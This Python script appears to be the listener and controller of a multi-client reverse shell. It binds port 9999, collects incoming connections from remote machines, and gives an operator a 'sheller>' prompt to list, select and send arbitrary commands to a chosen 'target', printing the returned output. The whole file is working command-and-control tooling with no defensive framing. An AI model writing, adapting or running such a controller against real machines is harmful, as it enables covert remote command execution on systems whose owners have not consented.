import socket
import threading
from queue import Queue
import time
import sys

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses =[]

#THREAD 2
# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

#Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        #print("Binding socket to port "+str(port))
        s.bind((host,port))
        s.listen(5) #no of bad connections after which it would be refusing connectionls
    except socket.error as msg:
        print("Socket binding error: "+str(msg)+"\n"+"Retrying...")
        socket_bind()

#Accept connections from multiple clients and save to list
def accept_connections():
    #cancel every connections
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address = s.accept()
            conn.setblocking(1) #no timeout
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: " + address[0])
        except:
            print("Error accepting connections")

#THREAD 2:
#Interactive prompt for sending commands remotely
def start_sheller():
    while 1:
        cmd = input('sheller> ')
        if cmd == 'list':
           list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'help':
            print("Use the command, "+"\n"+"list    ->   For listing the connections\nselect <id>     ->     For selecting to open ")
        else:
            print("Command not found.")

#Displays all current connections
def list_connections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(204800)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' | ' + str(all_addresses[i][0]) + ' | ' + str(all_addresses[i][1]) + '\n'
    print('-----Clients-----'+'\n'+results)

def get_target(cmd):
    try:
        target = int(cmd.replace('select ',''))
        conn = all_connections[target]
        print("You are now connected to "+str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ',end="")
        return conn
    except:
        print("Not a valid selection.")
        return None

#connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:  # we encode and decode them back and forth because the commands will be in byte format only
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Connection was lost")
            break

#Create threads
def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=thread_function)
        t.daemon = True #this makes sure the thread will die if we stop the script
        t.start()
#Do the next job in the queue
def thread_function():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_sheller()
        queue.task_done()   #this signifies says if the program is done
#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_threads()
create_jobs()